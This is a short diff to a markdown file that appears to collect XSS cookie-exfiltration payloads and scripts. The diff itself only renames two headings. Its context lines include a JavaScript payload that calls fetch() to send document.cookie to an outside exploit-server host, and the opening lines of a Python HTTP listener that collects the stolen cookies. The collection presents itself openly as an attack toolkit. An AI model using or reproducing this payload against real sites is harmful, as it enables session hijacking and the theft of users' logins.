@@ -1,4 +1,4 @@
-# 🐍 Python & JavaScript Scripts for XSS Cookie Exfiltration
+# Python and JavaScript Scripts for XSS Cookie Exfiltration
 
 Exfiltration payloads and scripts for capturing cookies via XSS vulnerabilities.
 
@@ -13,7 +13,7 @@ fetch('https://exploit-server.net/log?cookie=' + encodeURIComponent(document.coo
 
 ---
 
-## 2. Python Collaborator / Access Log Listener Script
+## 2. Python Listener Script
 
 ```python
 from http.server import HTTPServer, BaseHTTPRequestHandler
